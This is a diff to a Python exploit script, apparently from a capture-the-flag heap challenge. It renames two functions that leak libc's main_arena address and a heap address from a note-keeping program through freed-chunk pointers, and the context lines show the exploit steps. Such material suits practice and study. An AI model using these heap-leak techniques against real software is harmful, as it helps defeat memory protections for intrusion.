@@ -24,7 +24,7 @@ def delete_note(n):
 #
 # 1 free() -> fd & bk pointer points <main_arena>
 #
-def leak_after_one_free():
+def leak_main_arena():
     r.send('1\n')
     r.recvuntil('CCCCCCCC')
     l = r.recvuntil('\n')
@@ -43,7 +43,7 @@ def leak_after_one_free():
 #
 # we are going to leak this bk pointer.
 #
-def leak_after_two_free():
+def leak_heap():
     r.send('1\n')
     r.recvuntil('DDDDDDDD')
     l = r.recvuntil('\n')
@@ -65,7 +65,7 @@ if __name__ == "__main__":
     new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
     
     #offset = 0x7f103fc32b78 - 0x7f103f86e000 
-    main_arena = leak_after_one_free() 
+    main_arena = leak_main_arena() 
 
     log.info('main_arena: 0x%x' % main_arena)
 
@@ -88,6 +88,6 @@ if __name__ == "__main__":
 
     new_note('D'*8)
     #offset = 0x01c20820 - 0x01c1f000
-    leaked_heap = leak_after_two_free()
+    leaked_heap = leak_heap()
     
     raw_input('after leaking heap...')
